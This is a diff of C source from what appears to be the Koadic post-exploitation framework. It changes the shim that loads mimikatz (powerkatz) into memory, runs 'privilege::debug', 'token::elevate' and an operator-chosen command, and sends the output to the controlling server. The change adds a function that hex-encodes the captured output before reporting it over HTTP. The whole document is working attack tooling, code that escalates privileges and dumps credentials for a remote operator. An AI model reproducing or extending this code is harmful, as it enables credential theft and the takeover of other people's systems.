@@ -11,6 +11,22 @@
 
 extern HINSTANCE hAppInstance;
 
+void report_mimikatz_output(koadic_shim_parsed * parsed, wchar_t * output) 
+{
+	size_t len = wcslen(output);
+	char * output_as_bytes = (char *)output;
+
+	char * output_buffer = (char *)malloc(len * 4 + 1);
+	memset(output_buffer, 0, len * 4 + 1);
+
+	for (size_t i = 0; i < len * 2; i++) 
+	{
+		sprintf(&output_buffer[i * 2], "%02X", output_as_bytes[i]);
+	}
+	
+	koadic_http_report_work(parsed, output_buffer);
+}
+
 void koadic_mimikatz_shim(LPWSTR shim)
 {
 	char *data;
@@ -60,32 +76,21 @@ void koadic_mimikatz_shim(LPWSTR shim)
 		}
 
 		wchar_t *output;
-		char *str;
-		DWORD len;
 
 
 		// nothing interesting happens without these
 		output = powerkatz_invoke(hPowerkatz, L"privilege::debug");
-		len = wcslen(output);
-		str = (char*)malloc(len + 1);
-		wcstombs(str, output, len);
-		koadic_http_report_work(&parsed, str);
-		
+		report_mimikatz_output(&parsed, output);
+
 		output = powerkatz_invoke(hPowerkatz, L"token::elevate");
-		len = wcslen(output);
-		str = (char*)malloc(len + 1);
-		wcstombs(str, output, len);
-		koadic_http_report_work(&parsed, str);
+		report_mimikatz_output(&parsed, output);
 
 		WCHAR mimicmd[sizeof(parsed.mimicmd)];
 
 		mbstowcs(mimicmd, parsed.mimicmd, sizeof(mimicmd));
 
 		output = powerkatz_invoke(hPowerkatz, mimicmd);
-		len = wcslen(output);
-		str = (char*)malloc(len + 1);
-		wcstombs(str, output, len);
-		koadic_http_report_work(&parsed, str);
+		report_mimikatz_output(&parsed, output);
 
 		koadic_http_report_work(&parsed, "Complete");
 
